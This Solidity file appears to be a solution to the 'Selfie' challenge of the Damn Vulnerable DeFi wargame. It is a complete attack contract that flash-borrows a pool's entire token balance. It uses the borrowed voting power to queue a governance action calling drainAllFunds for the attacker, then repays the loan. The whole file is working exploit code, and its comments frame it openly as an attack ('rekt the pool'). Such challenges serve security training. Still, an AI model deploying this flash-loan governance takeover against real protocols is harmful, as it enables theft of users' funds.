// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import {Address} from "openzeppelin-contracts/utils/Address.sol";
import {DamnValuableTokenSnapshot} from "../DamnValuableTokenSnapshot.sol";

interface IFlashLoanReceiver {
    function receiveFlashLoan(uint256 amount) external;

    error SenderIsNotFlashLoanerPool();

    error SenderIsNotOwner();
}

interface ISelfiePool {
    function flashLoan(uint256 amount) external;
}

interface ISimpleGovernance {
    function queueAction(
        address receiver,
        bytes calldata data,
        uint256 weiAmount
    ) external returns (uint256);

    function executeAction(uint256 actionId) external payable;
}

contract FlashLoanReceiver {
    using Address for address;

    address private _attacker;
    DamnValuableTokenSnapshot private _dvtSnap;
    ISimpleGovernance private _simpleGovernance;
    ISelfiePool private _selfiePool;

    error SenderIsNotSelfiePool();
    error SenderIsNotOwner();
    error TransferFail();
    error CallFailed();

    constructor(
        address selfiePool,
        address simpleGovernanceAddress,
        address dvtAddress
    ) {
        _attacker = msg.sender;
        _selfiePool = ISelfiePool(selfiePool);
        _simpleGovernance = ISimpleGovernance(simpleGovernanceAddress);
        _dvtSnap = DamnValuableTokenSnapshot(dvtAddress);
    }

    function attack() external {
        if (msg.sender != _attacker) revert SenderIsNotOwner();
        // Just take everything
        uint256 everything = _dvtSnap.balanceOf(address(_selfiePool));
        assert(everything == 1_500_000e18);
        // And flashloan it
        _selfiePool.flashLoan(everything);

        if (_dvtSnap.balanceOf(address(this)) != everything)
            revert CallFailed();
    }

    function receiveTokens(address token, uint256 amount) external {
        if (msg.sender != address(_selfiePool)) revert SenderIsNotSelfiePool();
        // Then you craft the data to rekt the pool
        bytes memory evilPayload = abi.encodeWithSignature(
            "drainAllFunds(address)",
            _attacker
        );
        // Into its governance
        if (
            _simpleGovernance.queueAction(
                address(_selfiePool),
                evilPayload,
                0
            ) == 0
        ) revert CallFailed();

        // And you refund the pool
        _dvtSnap.transfer(address(_selfiePool), amount);
    }
}
